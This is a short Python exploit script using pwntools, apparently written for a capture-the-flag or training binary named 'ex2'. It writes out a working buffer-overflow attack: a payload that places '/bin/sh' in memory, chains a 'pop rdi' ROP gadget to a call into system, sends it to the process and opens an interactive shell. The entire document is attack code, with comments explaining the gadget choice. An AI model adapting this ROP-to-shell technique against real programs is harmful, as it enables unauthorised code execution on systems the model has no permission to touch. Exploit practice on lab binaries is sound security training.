#!/usr/bin/env python3

from pwn import *
target = process("./bin/ex2")

souldream_address = 0x404080

payload = b"/bin/sh\x00" + 64 * b"A"  # 8 + 64 = 72 bytes

# Now we need to find a ROP gadget that pops a value into the rdi register
# We can use this: 0x000000000040124f : pop rdi ; pop rbp ; ret
# Note that we have an extra pop rbp; we can just put a junk value there
pop_rdi_gadget = 0x40124f

deep_sleep_call_system_address = 0x4012b5

payload += p64(pop_rdi_gadget, "little") + p64(souldream_address, "little") + b"A" * 8 + p64(deep_sleep_call_system_address, "little")

target.send(payload)
target.interactive()
